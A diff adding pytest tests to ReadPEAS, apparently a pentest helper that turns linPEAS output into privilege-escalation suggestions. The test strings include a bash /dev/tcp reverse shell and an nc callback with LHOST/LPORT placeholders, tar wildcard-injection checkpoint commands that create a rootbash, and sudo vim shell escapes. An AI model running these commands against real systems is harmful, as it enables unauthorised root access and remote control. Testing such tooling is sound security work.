@@ -1,5 +1,6 @@
 """Unit tests for all ReadPEAS Linux analysis modules."""
 
+import os
 import pytest
 
 from modules.linux.sudo import analyze as sudo_analyze
@@ -14,6 +15,7 @@ from modules.linux.ld_preload import analyze as ldpreload_analyze
 from modules.linux.nfs import analyze as nfs_analyze
 from modules.linux.logrotate import analyze as logrotate_analyze
 from modules.linux.credentials import analyze as creds_analyze
+from modules.linux.wildcard_injection import analyze as wildcard_analyze
 
 
 # ── sudo.py ───────────────────────────────────────────────────────────────────
@@ -112,13 +114,29 @@ class TestSuid:
         assert f["severity"] == "CRITICAL"
         assert len(f["commands"]) > 0
 
-    def test_unknown_binary_standard_path_is_info(self):
+    def test_unknown_binary_standard_path_is_high(self):
         text = "-rwsr-xr-x 1 root root 22912 Mar 23 2022 /usr/bin/notabin\n"
         findings = suid_analyze(text)
         assert len(findings) == 1
         f = findings[0]
-        assert f["severity"] == "INFO"
-        assert f["commands"] == []
+        assert f["severity"] == "HIGH"
+        assert "Unknown SUID" in f.get("note", "")
+        assert len(f["commands"]) > 0
+
+    def test_unknown_suid_menu_is_high(self):
+        text = "-rwsr-xr-x 1 root root 18K Jan 2018 /usr/bin/menu\n"
+        findings = suid_analyze(text)
+        assert len(findings) == 1
+        f = findings[0]
+        assert f["severity"] == "HIGH"
+        assert "Unknown SUID" in f.get("note", "")
+
+    def test_known_safe_binary_is_info(self):
+        # su is in _KNOWN_SAFE → INFO even though it's not in GTFOBins
+        text = "-rwsr-xr-x 1 root root 44K May 2017 /bin/su\n"
+        findings = suid_analyze(text)
+        assert len(findings) == 1
+        assert findings[0]["severity"] == "INFO"
 
     def test_non_standard_path_is_critical(self):
         text = "-rwsr-xr-x 1 root root 22912 Mar 23 2022 /opt/custom_suid\n"
@@ -535,3 +553,188 @@ class TestCredentials:
         findings = creds_analyze(text)
         passwords = [f["password"] for f in findings]
         assert passwords.count("uniquepass123") == 1
+
+    def test_reuse_hint_in_commands(self):
+        text = "password = hunter2_real\n"
+        findings = creds_analyze(text)
+        assert len(findings) >= 1
+        cmds = findings[0]["commands"]
+        # Must have reuse hint lines
+        assert any("credential reuse" in c.lower() or "Try credential" in c for c in cmds)
+
+
+# ── wildcard_injection.py ──────────────────────────────────────────────────────
+
+class TestWildcardInjection:
+    def test_tar_wildcard_in_script_content_is_high(self):
+        text = (
+            "Contents of /home/milesdyson/backups/backup.sh:\n"
+            "#!/bin/bash\n"
+            "cd /var/www/html && tar cf /home/milesdyson/backups/backup.tgz *\n"
+        )
+        findings = wildcard_analyze(text)
+        assert len(findings) == 1
+        f = findings[0]
+        assert f["type"] == "wildcard_injection"
+        assert f["severity"] == "HIGH"
+        assert f["script"] == "/home/milesdyson/backups/backup.sh"
+        assert f["working_dir"] == "/var/www/html"
+        assert any("checkpoint=1" in c for c in f["commands"])
+
+    def test_tar_wildcard_direct_line(self):
+        text = "cd /tmp && tar czf /backup.tgz *\n"
+        findings = wildcard_analyze(text)
+        assert len(findings) >= 1
+        assert findings[0]["severity"] == "HIGH"
+
+    def test_no_tar_wildcard_returns_empty(self):
+        text = "*/1 * * * * root /home/milesdyson/backups/backup.sh\n"
+        findings = wildcard_analyze(text)
+        assert findings == []
+
+    def test_tar_without_wildcard_returns_empty(self):
+        text = "tar czf /backup.tgz /var/www/html\n"
+        findings = wildcard_analyze(text)
+        assert findings == []
+
+    def test_commands_include_checkpoint_and_rootbash(self):
+        text = "cd /var/www && tar czf /tmp/backup.tgz *\n"
+        findings = wildcard_analyze(text)
+        assert len(findings) == 1
+        cmds = findings[0]["commands"]
+        assert any("checkpoint=1" in c for c in cmds)
+        assert any("checkpoint-action" in c for c in cmds)
+        assert any("rootbash" in c for c in cmds)
+
+
+# ── ip/port injection (terminal.py) ───────────────────────────────────────────
+
+class TestIpPortInjection:
+    def test_lhost_lport_replaced(self):
+        from output.terminal import _inject_ip_port
+        cmd = "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
+        assert _inject_ip_port(cmd, "10.10.10.10", 9001) == \
+               "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"
+
+    def test_no_ip_leaves_placeholders(self):
+        from output.terminal import _inject_ip_port
+        cmd = "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
+        assert _inject_ip_port(cmd, None, 4444) == cmd
+
+    def test_default_port_used_when_only_ip_given(self):
+        from output.terminal import _inject_ip_port
+        cmd = "nc LHOST LPORT"
+        result = _inject_ip_port(cmd, "1.2.3.4", 4444)
+        assert result == "nc 1.2.3.4 4444"
+
+    def test_multiple_occurrences_replaced(self):
+        from output.terminal import _inject_ip_port
+        cmd = "echo LHOST:LPORT; connect LHOST LPORT"
+        result = _inject_ip_port(cmd, "10.0.0.1", 1234)
+        assert "LHOST" not in result
+        assert "LPORT" not in result
+
+
+# ── parser.py (sub-header stripping) ──────────────────────────────────────────
+
+class TestParser:
+    def test_sub_header_content_preserved(self):
+        from core.parser import split_sections
+        text = (
+            "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Main Section\n"
+            "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Sub Section\n"
+            "Content below sub-header\n"
+            "More content\n"
+        )
+        sections = split_sections(text)
+        assert "Main Section" in sections
+        content = sections["Main Section"]
+        assert "Content below sub-header" in content
+        assert "More content" in content
+        # The sub-header line itself should be stripped
+        assert "Sub Section" not in content
+
+    def test_sub_header_line_stripped_not_content(self):
+        from core.parser import split_sections
+        text = (
+            "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Sudo\n"
+            "env_keep+=LD_PRELOAD\n"
+            "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Details\n"
+            "User may run: /usr/bin/vim\n"
+        )
+        sections = split_sections(text)
+        assert "Sudo" in sections
+        content = sections["Sudo"]
+        assert "env_keep+=LD_PRELOAD" in content
+        assert "User may run: /usr/bin/vim" in content
+        assert "Details" not in content
+
+
+# ── markdown export ────────────────────────────────────────────────────────────
+
+class TestMarkdownExport:
+    def test_markdown_creates_file_with_headings(self, tmp_path):
+        from readpeas import _write_markdown
+        result = {
+            "os": "linux",
+            "total": 2,
+            "findings": [
+                {
+                    "type": "sudo",
+                    "binary": "vim",
+                    "full_path": "/usr/bin/vim",
+                    "severity": "CRITICAL",
+                    "nopasswd": True,
+                    "commands": ["sudo /usr/bin/vim -c ':!/bin/sh'"],
+                },
+                {
+                    "type": "capabilities",
+                    "binary": "ping",
+                    "full_path": "/usr/bin/ping",
+                    "caps": "cap_net_raw+ep",
+                    "severity": "HIGH",
+                    "commands": [],
+                },
+            ],
+        }
+        old_cwd = os.getcwd()
+        os.chdir(tmp_path)
+        try:
+            _write_markdown(result, "linpeas.txt")
+        finally:
+            os.chdir(old_cwd)
+
+        md_file = tmp_path / "linpeas.md"
+        assert md_file.exists()
+        content = md_file.read_text(encoding="utf-8")
+        assert "# ReadPEAS Report" in content
+        assert "## CRITICAL" in content
+        assert "## HIGH" in content
+        assert "### sudo" in content
+        assert "sudo /usr/bin/vim" in content
+
+    def test_markdown_no_info_section_when_empty(self, tmp_path):
+        from readpeas import _write_markdown
+        result = {
+            "os": "linux",
+            "total": 1,
+            "findings": [
+                {
+                    "type": "sudo",
+                    "binary": "vim",
+                    "full_path": "/usr/bin/vim",
+                    "severity": "CRITICAL",
+                    "nopasswd": True,
+                    "commands": ["sudo vim -c ':!/bin/sh'"],
+                },
+            ],
+        }
+        old_cwd = os.getcwd()
+        os.chdir(tmp_path)
+        try:
+            _write_markdown(result, "test.txt")
+        finally:
+            os.chdir(old_cwd)
+
+        content = (tmp_path / "test.md").read_text(encoding="utf-8")
+        assert "## INFO" not in content
